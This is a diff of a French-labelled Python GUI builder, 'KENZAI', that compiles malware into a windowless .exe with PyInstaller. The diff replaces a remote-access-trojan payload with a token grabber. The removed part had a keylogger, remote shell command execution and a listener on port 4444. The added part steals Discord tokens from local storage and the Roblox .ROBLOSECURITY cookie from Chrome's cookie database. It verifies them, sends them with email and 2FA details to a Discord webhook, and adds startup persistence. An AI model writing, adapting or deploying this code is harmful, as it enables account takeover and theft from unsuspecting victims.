@@ -1,9 +1,17 @@
 #!/usr/bin/env python3
-# KENZAI RAT BUILDER v2.0 - RAT avec contrôle Discord
+# KENZAI TOKEN GRABBER - Version NAVI
 
 import os
 import sys
 import json
+import re
+import sqlite3
+import shutil
+import requests
+import time
+import socket
+import getpass
+import platform
 import threading
 import subprocess
 import tkinter as tk
@@ -18,10 +26,10 @@ WHITE = '#ffffff'
 BLACK = '#000000'
 PANEL = '#0a0a0a'
 
-class KenzaiRATBuilder:
+class KenzaiTokenGrabber:
     def __init__(self):
         self.root = tk.Tk()
-        self.root.title("KENZAI RAT BUILDER v2.0")
+        self.root.title("KENZAI TOKEN GRABBER BUILDER")
         self.root.geometry("950x800")
         self.root.configure(bg=BLACK)
         self.root.resizable(False, False)
@@ -47,8 +55,8 @@ class KenzaiRATBuilder:
 {RED}   ██╔═██╗ ██╔══╝  ██║╚██╗██║ ███╔╝  ██╔══██║██║
 {RED}   ██║  ██╗███████╗██║ ╚████║███████╗██║  ██║██║
 {RED}   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝{WHITE}
-{CYAN}   - KENZAI RAT BUILDER v2.0 -{WHITE}
-{YELLOW}   - Controle a distance via Discord -{WHITE}
+{CYAN}   - Present Day, Present Time -{WHITE}
+{YELLOW}   - TOKEN GRABBER - DISCORD - ROBLOX -{WHITE}
 """
         
         tk.Label(header, text=logo_text, font=('Courier', 8), 
@@ -95,26 +103,29 @@ class KenzaiRATBuilder:
         self.filename_entry = tk.Entry(cfg, width=65, bg=BLACK, fg=GREEN,
                                       insertbackground=GREEN, font=('Arial',10))
         self.filename_entry.grid(row=1, column=1, padx=10, pady=10)
-        self.filename_entry.insert(0, "rat.exe")
+        self.filename_entry.insert(0, "grabber.exe")
         
         opts = tk.LabelFrame(main, text=" OPTIONS ", font=('Arial',11,'bold'),
                             fg=RED, bg=PANEL)
         opts.pack(fill=tk.X, pady=10)
         
+        self.grab_discord = tk.BooleanVar(value=True)
+        self.grab_roblox = tk.BooleanVar(value=True)
         self.persistence = tk.BooleanVar()
-        self.keylogger = tk.BooleanVar()
         
-        tk.Checkbutton(opts, text="Persistance au demarrage", variable=self.persistence,
+        tk.Checkbutton(opts, text="Graber Token Discord", variable=self.grab_discord,
                       fg=GREEN, bg=PANEL, selectcolor=BLACK).grid(row=0, column=0, padx=20, pady=5, sticky=tk.W)
-        tk.Checkbutton(opts, text="Keylogger", variable=self.keylogger,
+        tk.Checkbutton(opts, text="Graber Cookie Roblox", variable=self.grab_roblox,
                       fg=GREEN, bg=PANEL, selectcolor=BLACK).grid(row=0, column=1, padx=20, pady=5, sticky=tk.W)
+        tk.Checkbutton(opts, text="Persistance au demarrage", variable=self.persistence,
+                      fg=GREEN, bg=PANEL, selectcolor=BLACK).grid(row=1, column=0, padx=20, pady=5, sticky=tk.W)
         
         btn_frame = tk.Frame(main, bg=BLACK)
         btn_frame.pack(pady=20)
         
-        self.build_btn = tk.Button(btn_frame, text="BUILD RAT", 
+        self.build_btn = tk.Button(btn_frame, text="BUILD GRABBER", 
                                    font=('Arial', 12, 'bold'), bg=RED, fg=BLACK,
-                                   padx=20, pady=10, command=self.build_rat)
+                                   padx=20, pady=10, command=self.build_grabber)
         self.build_btn.pack()
         
         console = tk.LabelFrame(main, text=" CONSOLE ", font=('Arial',11,'bold'),
@@ -156,7 +167,7 @@ class KenzaiRATBuilder:
             f.write(self.logs_text.get(1.0, END))
         messagebox.showinfo("Succès", f"Logs sauvegardés: {filename}")
     
-    def build_rat(self):
+    def build_grabber(self):
         webhook = self.webhook_entry.get().strip()
         filename = self.filename_entry.get().strip()
         
@@ -164,7 +175,7 @@ class KenzaiRATBuilder:
             messagebox.showerror("Erreur", "Webhook requis")
             return
         if not filename:
-            filename = "rat.exe"
+            filename = "grabber.exe"
         if not filename.endswith('.exe'):
             filename += '.exe'
         
@@ -173,19 +184,20 @@ class KenzaiRATBuilder:
         
         def build_thread():
             try:
+                grab_discord = "True" if self.grab_discord.get() else "False"
+                grab_roblox = "True" if self.grab_roblox.get() else "False"
                 persistence = "True" if self.persistence.get() else "False"
-                keylogger = "True" if self.keylogger.get() else "False"
                 
-                payload = self.generate_payload(webhook, persistence, keylogger)
+                payload = self.generate_payload(webhook, grab_discord, grab_roblox, persistence)
                 
-                with open("rat_payload.py", "w", encoding="utf-8") as f:
+                with open("grabber_payload.py", "w", encoding="utf-8") as f:
                     f.write(payload)
                 
                 self.log("Compilation en .exe... (30-60s)")
                 
                 subprocess.run(
                     [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", 
-                     "--name", filename.replace(".exe", ""), "rat_payload.py"],
+                     "--name", filename.replace(".exe", ""), "grabber_payload.py"],
                     capture_output=True
                 )
                 
@@ -193,11 +205,11 @@ class KenzaiRATBuilder:
                     size = os.path.getsize(f"dist\\{filename}")
                     self.log("BUILD REUSSI !")
                     self.log(f"Fichier: dist\\{filename} ({size:,} bytes)")
-                    messagebox.showinfo("Succès", f"RAT construit !\n\nFichier: dist\\{filename}")
+                    messagebox.showinfo("Succès", f"Grabber construit !\n\nFichier: dist\\{filename}")
                 else:
                     self.log("ERREUR: Échec compilation")
                 
-                for f in ["rat_payload.py", "rat_payload.spec"]:
+                for f in ["grabber_payload.py", "grabber_payload.spec"]:
                     if os.path.exists(f): os.remove(f)
                 if os.path.exists("build"):
                     shutil.rmtree("build")
@@ -205,26 +217,22 @@ class KenzaiRATBuilder:
             except Exception as e:
                 self.log(f"ERREUR: {str(e)}")
             finally:
-                self.build_btn.config(state=tk.NORMAL, text="BUILD RAT")
+                self.build_btn.config(state=tk.NORMAL, text="BUILD GRABBER")
         
         threading.Thread(target=build_thread, daemon=True).start()
     
-    def generate_payload(self, webhook, persistence, keylogger):
-        return f'''import os, sys, json, requests, time, socket, subprocess, getpass, platform, threading
+    def generate_payload(self, webhook, grab_discord, grab_roblox, persistence):
+        return f'''import os, sys, json, re, sqlite3, shutil, requests, time, socket, getpass, platform, glob
 from datetime import datetime
 
 WEBHOOK = "{webhook}"
+GRAB_DISCORD = {grab_discord}
+GRAB_ROBLOX = {grab_roblox}
 PERSIST = {persistence}
-KEYLOG = {keylogger}
 
 def send_embed(title, desc, color=0xff0000):
     try:
         requests.post(WEBHOOK, json={{"embeds": [{{"title": title, "description": desc[:1900], "color": color}}]}}, timeout=10)
-    except: pass
-
-def send_msg(msg):
-    try:
-        requests.post(WEBHOOK, json={{"content": msg}}, timeout=10)
     except: pass
 
 def get_info():
@@ -234,20 +242,58 @@ def get_info():
         ip = "?"
     return f"PC: {{socket.gethostname()}}\\nUser: {{getpass.getuser()}}\\nOS: {{platform.system()}}\\nIP: {{ip}}"
 
-def execute_cmd(cmd):
+def get_discord_tokens():
+    tokens = []
+    paths = [
+        os.environ.get("APPDATA", "") + "\\\\discord\\\\Local Storage\\\\leveldb",
+        os.environ.get("APPDATA", "") + "\\\\discordcanary\\\\Local Storage\\\\leveldb",
+        os.environ.get("APPDATA", "") + "\\\\discordptb\\\\Local Storage\\\\leveldb",
+        os.environ.get("LOCALAPPDATA", "") + "\\\\Discord\\\\Local Storage\\\\leveldb"
+    ]
+    for path in paths:
+        if os.path.exists(path):
+            for f in os.listdir(path):
+                if f.endswith((".log", ".ldb")):
+                    try:
+                        with open(os.path.join(path, f), "r", errors="ignore") as file:
+                            content = file.read()
+                            found = re.findall(r'[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}', content)
+                            tokens.extend(found)
+                    except: pass
+    return list(set(tokens))
+
+def verify_token(token):
     try:
-        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
-        return r.stdout + r.stderr
-    except:
-        return "Erreur"
+        r = requests.get("https://discord.com/api/v9/users/@me", headers={{"Authorization": token}}, timeout=5)
+        if r.status_code == 200:
+            return r.json()
+    except: pass
+    return None
 
-def reboot():
-    os.system("shutdown /r /t 5")
-    return "Redemarrage dans 5s"
+def get_roblox_cookie():
+    cookie_path = os.environ.get("LOCALAPPDATA", "") + "\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies"
+    if os.path.exists(cookie_path):
+        try:
+            temp = os.environ["TEMP"] + "\\\\cookies.db"
+            shutil.copy2(cookie_path, temp)
+            conn = sqlite3.connect(temp)
+            c = conn.cursor()
+            c.execute("SELECT value FROM cookies WHERE name = '.ROBLOSECURITY'")
+            row = c.fetchone()
+            conn.close()
+            os.remove(temp)
+            if row:
+                return row[0]
+        except: pass
+    return None
 
-def open_app(app):
-    os.system(f"start {{app}}")
-    return f"Ouverture de {{app}}"
+def verify_roblox(cookie):
+    try:
+        r = requests.get("https://www.roblox.com/mobileapi/userinfo", headers={{"Cookie": f".ROBLOSECURITY={{cookie}}"}}, timeout=5)
+        if r.status_code == 200:
+            return r.json()
+    except: pass
+    return None
 
 def persist():
     if not PERSIST:
@@ -259,68 +305,42 @@ def persist():
             shutil.copy2(sys.argv[0], dest)
     except: pass
 
-def keylogger_thread():
-    if not KEYLOG:
-        return
-    try:
-        from pynput import keyboard
-        log = ""
-        def on_press(key):
-            nonlocal log
-            try:
-                log += key.char
-            except:
-                log += f" [{{key}}] "
-            if len(log) > 200:
-                send_msg(f"Keylog: {{log}}")
-                log = ""
-        listener = keyboard.Listener(on_press=on_press)
-        listener.start()
-    except: pass
-
 def main():
     send_embed("NOUVEAU CLIENT", get_info(), 0x00ff00)
+    
+    if GRAB_DISCORD:
+        tokens = get_discord_tokens()
+        if tokens:
+            for t in tokens:
+                u = verify_token(t)
+                if u:
+                    desc = f"Token: {{t}}\\nUser: {{u['username']}}#{{u.get('discriminator','0000')}}\\nID: {{u['id']}}\\nEmail: {{u.get('email', 'None')}}\\n2FA: {{u.get('mfa_enabled')}}"
+                    send_embed("TOKEN DISCORD VALIDE", desc, 0x00ff00)
+                else:
+                    send_embed("TOKEN DISCORD INVALIDE", f"Token: {{t}}", 0xff6600)
+    
+    if GRAB_ROBLOX:
+        cookie = get_roblox_cookie()
+        if cookie:
+            send_embed("COOKIE ROBLOX TROUVE", f"Cookie: {{cookie}}", 0xffa500)
+            u = verify_roblox(cookie)
+            if u:
+                send_embed("CONNEXION ROBLOX", f"User: {{u.get('UserName')}}\\nID: {{u.get('UserID')}}\\nRobux: {{u.get('RobuxBalance')}}", 0x00ff00)
+    
     persist()
-    keylogger_thread()
-    
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind(("0.0.0.0", 4444))
-    s.listen(5)
-    
     while True:
-        conn, addr = s.accept()
-        while True:
-            try:
-                data = conn.recv(4096).decode()
-                if not data:
-                    break
-                if data == "info":
-                    conn.send(get_info().encode())
-                elif data == "reboot":
-                    conn.send(reboot().encode())
-                elif data.startswith("open "):
-                    conn.send(open_app(data[5:]).encode())
-                elif data.startswith("cmd "):
-                    r = execute_cmd(data[4:])
-                    conn.send(r.encode()[:4000])
-                elif data == "kill":
-                    conn.send(b"dying")
-                    sys.exit()
-            except:
-                break
-        conn.close()
+        time.sleep(60)
 
 if __name__ == "__main__":
     try:
         main()
     except Exception as e:
-        send_msg(f"Erreur: {{str(e)}}")
+        send_embed("ERREUR", str(e), 0xff0000)
 '''
     
     def run(self):
         self.root.mainloop()
 
 if __name__ == "__main__":
-    app = KenzaiRATBuilder()
+    app = KenzaiTokenGrabber()
     app.run()
